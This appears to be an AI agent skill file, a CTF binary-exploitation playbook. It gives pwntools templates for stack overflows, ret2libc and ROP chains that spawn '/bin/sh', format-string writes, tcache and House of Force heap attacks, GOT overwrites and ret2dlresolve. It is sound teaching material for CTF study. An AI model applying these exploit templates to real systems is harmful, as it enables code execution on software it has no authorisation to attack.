---
name: ctf-pwn
description: "CTF binary exploitation skill. When user mentions pwn challenges, buffer overflow, ROP chains, format string vulnerabilities, heap exploitation, use-after-free, tcache poisoning, syscall exploitation, ret2libc, ret2plt, GOT overwrite, PIE/ASLR/NX bypass, or binary exploitation in a CTF context. Covers all major binary exploitation techniques with step-by-step methodology, payloads, and tool usage."
---

# CTF Binary Exploitation (Pwn) — Challenge Solving Brain

When solving pwn challenges:
1. **Check protections** — NX, PIE, ASLR, canary, RELRO
2. **Find the vulnerability** — overflow, format string, UAF, etc.
3. **Determine exploit strategy** — what can you overwrite?
4. **Build the payload** — chain ROP gadgets or overwrite structures
5. **Handle ASLR** — leak addresses first, then exploit

---

## Phase 1: Binary Analysis

### Check Protections
```bash
# Check binary protections
checksec --file=vulnerable
readelf -l vulnerable | grep GNU_STACK

# Output interpretation:
# NX: Non-executable stack (can't shellcode on stack)
# PIE: Position Independent Executable (randomized base)
# RELRO: Relocation Read-Only (GOT protection)
# Stack Canary: Stack protection value
# ASLR: Address Space Layout Randomization (kernel setting)
```

### IDA/Ghidra Analysis
```
CHECKLIST:
□ Find main function
□ Find vulnerable function (gets, strcpy, scanf, printf)
□ Check buffer sizes and locations (stack, heap, bss)
□ Identify input/output functions
□ Check for canary usage (__stack_chk_fail)
□ Find useful functions (system, execve, read, write)
□ Locate gadgets and PLT/GOT entries
□ Note any custom input parsing
```

### Function Mapping
```bash
# Find useful functions
objdump -d binary | grep -E "system|execve|read|write|printf|gets"

# Find gadgets (ROP)
ROPgadget --binary binary
ropper --file binary --search "pop rdi"

# Find PLT entries (for calling functions)
objdump -d binary | grep "@plt" | grep -v "@plt>:"

# Find GOT entries (for overwriting)
objdump -R binary
readelf -r binary
```

---

## Phase 2: Stack Buffer Overflow

### Basic Overflow
```python
from pwn import *

# Padding to overwrite saved RIP
# offset = distance from buffer start to saved RIP
payload = b'A' * offset
payload += p64(target_address)

# Example: buffer at [rbp-0x20], saved RIP at [rbp+0x08]
# offset = 0x20 + 0x08 = 0x28 = 40 bytes
payload = b'A' * 40 + p64(0x4011b0)  # target address
```

### Finding Offset
```python
# Pattern create and search
pattern = cyclic(200)
io.sendline(pattern)
io.wait()

# Find offset
offset = cyclic_find(io.corefile.fault_addr)
# Or in GDB
# pattern search $rsp
```

### Ret2Win
```python
from pwn import *

elf = ELF('./vulnerable')
p = process('./vulnerable')

# Overwrite return address with win function
payload = b'A' * offset + p64(elf.symbols['win'])
p.sendline(payload)
p.interactive()
```

### ret2libc
```python
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')
p = process('./vulnerable')

# Leak libc address (if there's a leak)
# Then:
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x401016      # ret (for stack alignment)

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)  # 16-byte stack alignment
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
```

### ret2plt
```python
# Use PLT to call functions (works with PIE if base is known)
# PLT entries are at fixed offsets within the binary

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# Leak libc via puts
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(elf.symbols['main'])  # Return to main for second stage

p.sendline(payload)
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
```

---

## Phase 3: ROP Chains

### Building ROP Chains
```python
from pwn import *

# Auto ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

payload = b'A' * offset + rop.chain()

# Manual ROP
pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx = 0x401238

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
```

### Gadgets
```bash
# Find gadgets
ROPgadget --binary binary --only "pop|ret"
ropper --file binary --search "pop rdi; ret"
ROPgadget --binary binary --ropchain

# Common gadgets needed
pop rdi; ret          # Set first argument
pop rsi; ret          # Set second argument
pop rdx; ret          # Set third argument (often rdx_rbx)
pop rax; ret          # Set syscall number
syscall; ret          # Make syscall
```

### ROP Chain Templates

```python
# execve("/bin/sh", NULL, NULL)
pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx_rbx = 0x401238
pop_rax = 0x401240
syscall = 0x401242

payload = b'A' * offset
# "/bin/sh" already in libc or need to write it
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)  # execve syscall
payload += p64(syscall)
```

---

## Phase 4: Format String Vulnerability

### Leak Stack Values
```python
# %p leaks pointer values
# %x leaks 32-bit values
# %lx leaks 64-bit values
# %s reads from pointer

# Leak canary
payload = b'%15$p'  # Offset to canary (find with GDB)

# Leak libc address
payload = b'%17$p'  # Offset to __libc_start_main return

# Leak stack address
payload = b'%13$p'
```

### Arbitrary Write with %n
```python
# %n writes number of bytes printed so far to an address
# %hn writes 2 bytes (half word)
# %hhn writes 1 byte
# %ln writes 8 bytes

# Write to address
addr = 0x404040  # Target address
value = 0xdeadbeef

# Split value into bytes
bytes_to_write = p64(value)

# Build payload
payload = b''
payload += p64(addr)  # Address to write
payload += f'%{value}c%7$n'.encode()  # Write value to addr at offset 7
```

### Format String Write
```python
def fmt_str(offset, addr, value):
    payload = b''
    payload += p64(addr)
    payload += f'%{value - 8}c%{offset}$hn'.encode()
    return payload

# For 8 bytes at once
def fmt_str64(offset, addr, value):
    payload = b''
    # Split into 2 bytes each
    values = [(value >> (16 * i)) & 0xffff for i in range(4)]
    for i, val in enumerate(values):
        payload += p64(addr + 2 * i)
    
    # Sort by value
    sorted_vals = sorted(enumerate(values), key=lambda x: x[1])
    
    for idx, (orig_idx, val) in enumerate(sorted_vals):
        if val == 0:
            continue
        payload += f'%{val}c%{offset + idx}$hn'.encode()
    
    return payload
```

### One-Gadget
```bash
# Find one-gadget RCE (single address that gives shell)
one_gadget libc.so.6

# Typical output:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
```

---

## Phase 5: Heap Exploitation

### Heap Basics
```
Heap structures:
  chunks: malloc返回的内存块
  bins: 空闲chunk的链表
  tcache: per-thread cache (fast bins)
  fast bins: small chunks (16-80 bytes)
  unsorted bin: recently freed chunks
  small bin: small chunks
  large bin: large chunks (> 0x400)
```

### Use-After-Free
```python
# Allocate and free chunks
# Reallocate to overlap with freed chunk
# Modify function pointer or data

# tcache poisoning
alloc(0x20)  # chunk A
alloc(0x20)  # chunk B
free(A)      # A goes to tcache
# Overwrite A's fd pointer (next chunk in free list)
# When A is reallocated, fd points to target

# Fastbin attack
alloc(0x40)  # chunk A
alloc(0x40)  # chunk B
free(A)      # A goes to fastbin
free(B)      # B goes to fastbin
# Overwrite A's fd to point to target
alloc(0x40)  # Gets A
alloc(0x40)  # Gets B
alloc(0x40)  # Gets target!
```

### Tcache Poisoning
```python
# tcache is a singly-linked list
# fd pointer points to next free chunk
# Can overwrite fd to point anywhere

# When malloc'd, returns the chunk at head of tcache
# Next malloc returns our target address

# Requirements:
# - UAF or heap overflow to corrupt fd
# - Target address must be aligned (usually to 0x10)
```

### House of Force
```python
# Overwrite top chunk size to 0xffffffffffffffff
# Then calculate offset to target
# malloc large amount to move top chunk to target

top_chunk_size_addr = heap_base + top_chunk_offset
target_addr = 0x404040
offset = target_addr - top_chunk_size_addr - 0x10
# Need to handle negative numbers
if offset < 0:
    offset = (2**64 + offset)
```

### House of Spirit
```python
# Create fake chunk on stack or in controlled memory
# Free it to add to tcache/fastbin
# Malloc returns controlled address

# Fake chunk structure:
# [size] [prev_size] [fd] [bk] ...
# Size must match tcache/fastbin requirements
```

---

## Phase 6: Syscall Exploitation

### Direct Syscall
```python
# execve("/bin/sh", NULL, NULL)
# syscall number: 59 (0x3b) on x86_64

pop_rax = 0x401234
pop_rdi = 0x401236
pop_rsi = 0x401238
pop_rdx_rbx = 0x401240
syscall = 0x401242

payload = b'A' * offset
# "/bin/sh" in memory
binsh = next(libc.search(b'/bin/sh'))

payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(syscall)
```

### open-read-write Chain
```python
# open("flag.txt", 0)
# read(fd, buffer, size)
# write(1, buffer, size)

# x86_64 syscalls:
# open: 2
# read: 0
# write: 1

# Chain:
# 1. open("flag.txt", 0)
pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx_rbx = 0x401238
pop_rax = 0x401240
syscall = 0x401242

payload = b'A' * offset
# open
payload += p64(pop_rax)
payload += p64(2)  # open
payload += p64(pop_rdi)
payload += p64(flag_str_addr)  # "flag.txt"
payload += p64(pop_rsi)
payload += p64(0)  # O_RDONLY
payload += p64(syscall)
# read
payload += p64(pop_rax)
payload += p64(0)  # read
payload += p64(pop_rdi)
payload += p64(3)  # fd (3 after stdin/stdout/stderr)
payload += p64(pop_rsi)
payload += p64(buffer_addr)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(syscall)
# write
payload += p64(pop_rax)
payload += p64(1)  # write
payload += p64(pop_rdi)
payload += p64(1)  # stdout
payload += p64(pop_rsi)
payload += p64(buffer_addr)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(syscall)
```

---

## Phase 7: GOT Overwrite

### When RELRO is Partial
```python
# GOT entries can be overwritten
# After calling a function once, GOT points to libc
# Can overwrite GOT entry to point to system/one_gadget

# After leaking libc:
puts_got = elf.got['puts']
system_addr = libc.symbols['system']

# Use format string or write-what-where to overwrite
# GOT[puts] = system
# When puts("/bin/sh") is called, system("/bin/sh") is called instead
```

### GOT Overwrite via Format String
```python
# If binary is PIE and has format string
# Can overwrite GOT entries

def overwrite_got(func_name, target_addr):
    got_addr = elf.got[func_name]
    # Use format string to write
    payload = fmt_str(offset, got_addr, target_addr)
    return payload
```

---

## Phase 8: PIE/ASLR Bypass

### PIE Bypass
```
Options:
1. Leak a text address, calculate base
2. Partial overwrite of return address
3. Partial overwrite of function pointer
4. Brute force (if low entropy)

# Partial overwrite example
# If PIE is enabled, only need to overwrite low bytes
# 0x401234 → 0x4011b0 (change low 2 bytes)
payload = b'A' * offset + p16(0x11b0)  # Only overwrite 2 bytes
```

### ASLR Bypass
```
Options:
1. Information leak (stack, libc, heap)
2. Partial overwrite
3. Brute force (low entropy targets)
4. Ret2dlresolve (dynamically resolve functions)

# Leak libc from GOT
# Leak stack from environ
# Leak heap from tcache
```

### Ret2dlresolve
```python
# When PIE and ASLR are enabled
# Use ret2dlresolve to call any function
from pwn import *

# pwntools auto-generates ret2dlresolve
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = b'A' * offset + rop.chain()
p.sendline(payload)
p.sendline(dlresolve.payload)
p.interactive()
```

---

## Quick Reference: x86_64 Calling Convention

```
Arguments:
  rdi = first argument
  rsi = second argument
  rdx = third argument
  rcx = fourth argument
  r8 = fifth argument
  r9 = sixth argument

Return:
  rax = return value

Syscall:
  rax = syscall number
  rdi = arg1
  rsi = arg2
  rdx = arg3
  syscall instruction

Common syscalls (x86_64):
  0  = read
  1  = write
  2  = open
  57 = fork
  59 = execve
  60 = exit
```

---

## Quick Reference: Protection Bypass

```
NX → ROP, ret2libc, ret2plt
PIE → Leak text base, partial overwrite, ret2dlresolve
ASLR → Leak libc/heap/stack, brute force
Canary → Leak canary (format string, overflow), stack pivoting
RELRO → Only partial RELRO allows GOT overwrite
FORTIFY → Less common in CTF, check for fortified functions
```

---

## GDB/pwndbg Commands

```bash
# Start
gdb ./binary
pwndbg ./binary

# Breakpoints
b *0x4011b0
b main

# Run
r
r < input.txt
r <<< "AAAA"

# Examine
x/20x $rsp          # Examine stack
x/s 0x404040        # Examine string
x/10i $rip          # Disassemble at RIP
info functions       # List functions
info variables       # List variables

# Heap
heap chunks          # List heap chunks
heap bins            # List free bins
heap tcache          # List tcache

# Info
info registers       # All registers
info proc mappings   # Memory mappings
vmmap               # Virtual memory map

# Pattern
pattern create 200
pattern search

# GOT/PLT
got                  # GOT entries
plt                  # PLT entries

# One-gadget
one_gadget libc.so.6
```

---

**Remember:** Pwn is about finding the vulnerability, understanding the binary's protections, and chaining the right techniques. Always check protections first, then find the vulnerability, then determine the exploit strategy. Practice with known vulnerable binaries.
